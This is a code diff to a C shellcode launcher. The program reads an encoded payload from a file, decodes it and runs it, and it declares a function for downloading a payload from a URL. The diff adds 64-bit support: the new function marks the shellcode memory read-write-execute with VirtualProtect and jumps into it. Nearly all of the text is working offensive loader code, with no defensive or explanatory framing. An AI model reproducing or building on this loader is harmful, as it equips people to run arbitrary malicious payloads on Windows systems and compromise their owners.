@@ -38,6 +38,7 @@ int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
 void exec_shellcode(unsigned char *shellcode);
+void exec_shellcode64(unsigned char *shellcode);
 #ifdef UVALUE
 char* ie_download(char* string, char* sh_filename);
 #endif
@@ -105,7 +106,12 @@ int main (int argc, char **argv)
 #endif
 
 		shellcode = decode_shellcode(buffer,shellcode,size);
-		exec_shellcode(shellcode);
+		#ifndef X64 
+			exec_shellcode(shellcode);
+		#endif
+		#ifdef X64
+			exec_shellcode64(shellcode);
+		#endif
 	}
 	// exec from url
 #ifdef UVALUE
@@ -223,6 +229,7 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 	return shellcode;
 }
 
+#ifndef X64
 void exec_shellcode(unsigned char *shellcode)
 {
 	#ifdef PRINT_DEBUG
@@ -233,6 +240,20 @@ void exec_shellcode(unsigned char *shellcode)
 	funct = (int (*)()) shellcode;
 	(int)(*funct)();
 }
+#endif
+
+#ifdef X64
+void exec_shellcode64(unsigned char *shellcode)
+{
+#ifdef PRINT_DEBUG
+	printf("exec_shellcode64\n ");
+#endif
+	int len=strlen(shellcode);
+	DWORD l=0;
+	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
+	(* (int(*)()) shellcode)();
+}
+#endif
 
 #ifdef UVALUE
 // return pointer to the filename
